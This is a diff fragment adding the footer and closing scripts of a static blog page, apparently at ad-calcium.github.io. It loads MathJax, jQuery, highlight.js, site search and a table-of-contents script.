+    2021
+
+    
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://ad-calcium.github.io/js/application.min.a94ab19cb63a95c8d7fbd7b85cab3ddeea8c369bdf75b9cab6708787ead123af.js"></script>
+<script src="https://ad-calcium.github.io/js/plugin.min.19c5bcb2fb0789ab4f2b7834e5ceb5e92635645605bab902c1024b25f1502364.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(未命名)',
+            },
+            ROOT_URL: 'https:\/\/ad-calcium.github.io\/',
+            CONTENT_URL: 'https:\/\/ad-calcium.github.io\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://ad-calcium.github.io/js/insight.min.4a2d52de4bfff73e0c688404fe3d17c9a3ae12d9888e1e1ac9c690e4890de2ded50fe55f2b819c2ba55435a76f396f3ea6805765f0b0af5635cdf74ea459eab0.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
